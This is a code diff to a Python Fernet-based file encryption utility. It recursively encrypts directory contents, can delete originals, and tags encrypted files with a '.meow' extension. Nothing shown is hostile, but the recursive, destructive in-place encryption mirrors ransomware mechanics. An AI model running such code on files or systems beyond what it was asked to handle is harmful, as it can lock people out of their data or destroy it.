@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet
-from os import listdir, remove
-from os.path import isdir
+from os import listdir, remove, chdir
+from os.path import isdir, dirname, abspath
+from sys import argv
 
 
 class EncryptionTools:
@@ -45,7 +46,8 @@ class EncryptionTools:
                 dirContents = [i + '\\' + file for file in listdir(i)]
                 EncryptionTools.encryptFiles(f, dirContents, destructive)
             else:
-                EncryptionTools.encryptFile(i, f, destructive)
+                if not i.endswith('.meow'):
+                    EncryptionTools.encryptFile(i, f, destructive)
 
     @staticmethod
     def decryptFile(fileName: str, f: Fernet, destructive: bool = True) -> None:
@@ -73,7 +75,8 @@ class EncryptionTools:
                 dirContents = [i + '\\' + file for file in listdir(i)]
                 EncryptionTools.decryptFiles(f, dirContents, destructive)
             else:
-                EncryptionTools.decryptFile(i, f, destructive)
+                if i.endswith('.meow'):
+                    EncryptionTools.decryptFile(i, f, destructive)
         
 
 def main():
